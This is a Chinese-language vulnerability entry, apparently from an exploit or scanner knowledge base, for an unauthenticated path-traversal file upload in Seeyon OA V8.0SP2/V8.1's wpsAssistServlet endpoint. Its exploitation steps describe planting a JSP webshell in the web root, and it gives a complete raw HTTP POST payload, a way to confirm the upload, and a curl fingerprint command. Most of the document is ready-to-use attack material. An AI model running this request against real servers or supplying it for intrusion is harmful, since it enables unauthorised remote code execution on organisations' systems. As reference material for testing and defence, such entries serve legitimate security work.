---
id: SEEYON-WPSASSIST-UPLOAD
title: 致远OA wpsAssistServlet 任意文件上传
product: seeyon-oa
vendor: 北京致远互联
version_affected: "V8.0SP2, V8.1"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产, oa]
fingerprint: ["致远", "Seeyon", "wpsAssistServlet"]
---

## 漏洞描述

致远OA V8.0SP2/V8.1 的 wpsAssistServlet 接口存在路径穿越文件上传漏洞，可上传 JSP webshell。

## 影响版本

- V8.0SP2
- V8.1

## 前置条件

- 无需认证，可直接利用
- 目标版本为 V8.0SP2 或 V8.1

## 利用步骤

1. 确认目标存在 `/seeyon/wpsAssistServlet` 接口
2. 构造路径穿越参数 `fileId=../../base/webapp/test` 将文件写入 Web 目录
3. 通过 multipart 上传 JSP webshell 文件
4. 访问 `/seeyon/test.jsp` 确认 webshell 上传成功

## Payload

```http
POST /seeyon/wpsAssistServlet?flag=save&realFileType=.jsp&fileId=../../base/webapp/test HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

<%out.print("vuln_test");%>
------WebKitFormBoundary--
```

访问 `/seeyon/test.jsp` 确认上传。

## 验证方法

访问 `/seeyon/test.jsp` 返回 `vuln_test` 即确认成功。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/seeyon/wpsAssistServlet"
```
